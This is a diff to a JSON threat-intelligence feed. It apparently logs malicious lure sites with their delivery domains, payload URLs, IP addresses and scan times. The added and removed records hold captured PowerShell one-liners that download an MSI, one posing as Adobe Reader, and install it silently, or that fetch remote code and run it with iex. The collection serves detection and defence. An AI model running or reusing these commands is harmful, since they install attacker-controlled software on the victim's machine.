@@ -1,5 +1,43 @@
 [
   {
+    "UrlDomain": "dekingsproject.com",
+    "DeliveryUrl": [
+      "softsyncizobrazie.net"
+    ],
+    "PayloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "IP": [
+      "199.188.206.22"
+    ],
+    "Related": [],
+    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
+    "ResolvedDownloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "ReportId": "cmwgs7swd0lxo0oml3ahm9x1b",
+    "ScannedAt": "2026-11-14T19:11:36.644000+00:00"
+  },
+  {
+    "UrlDomain": "pdfdocumentsharepoint.com",
+    "DeliveryUrl": [
+      "virtual-video-session.com"
+    ],
+    "PayloadUrl": [
+      "https://virtual-video-session.com/Adobe%20Reader.msi"
+    ],
+    "IP": [
+      "188.114.97.0"
+    ],
+    "Related": [],
+    "Payload": "powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri 'https://virtual-video-session[.]com/Adobe%20Reader.msi' -OutFile $env:TEMP\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\sc.msi, '/quiet', '/norestart' -Wait; exit\" powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri 'https://virtual-video-session[.]com/Adobe%20Reader.msi' -OutFile $env:TEMP\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\sc.msi, '/quiet', '/norestart' -Wait; exit\" powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri 'https://virtual-video-session[.]com/Adobe%20Reader.msi' -OutFile $env:TEMP\\\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\\\sc.msi, ' powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri 'https://virtual-video-session[.]com/Adobe%20Reader.msi' -OutFile $env:TEMP\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\sc.msi, '/q powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing -Uri 'https://virtual-video-session[.]com/Adobe%20Reader.msi' -OutFile $env:TEMP\\\\sc.msi; Start-Process msiexec -ArgumentList '/i', $env:TEMP\\\\sc.",
+    "ResolvedDownloadUrl": [
+      "https://virtual-video-session.com/Adobe%20Reader.msi"
+    ],
+    "ReportId": "cmwgrz6qp0lwz0omly2u8bt21",
+    "ScannedAt": "2026-11-14T19:04:54.671000+00:00"
+  },
+  {
     "UrlDomain": "atharvarealties.com",
     "DeliveryUrl": [
       "softsyncizobrazie.net"
@@ -9175,26 +9213,5 @@
     ],
     "ReportId": "cmw9qc8do03h30omlv9zigk19",
     "ScannedAt": "2026-11-09T20:44:40.970000+00:00"
-  },
-  {
-    "UrlDomain": "imretrades.com",
-    "DeliveryUrl": [
-      "cloudeccentric.cc",
-      "yaponovosh.org",
-      "cosmical2049.com"
-    ],
-    "PayloadUrl": [
-      "https://cosmical2049.com/lom3/0ad7a0bdad0aa13d"
-    ],
-    "IP": [
-      "141.193.213.10"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://cosmical2049[.]com/lom3/0ad7a0bdad0aa13d' -UserAgent 'WUA/adedf1881f' -Headers @{'X-WUA'='adedf1881f'})|iex",
-    "ResolvedDownloadUrl": [
-      "https://cosmical2049.com/lom3/0ad7a0bdad0aa13d"
-    ],
-    "ReportId": "cmw9n6mj101wv0oml32xyr1jx",
-    "ScannedAt": "2026-11-09T19:16:20.516000+00:00"
   }
 ]
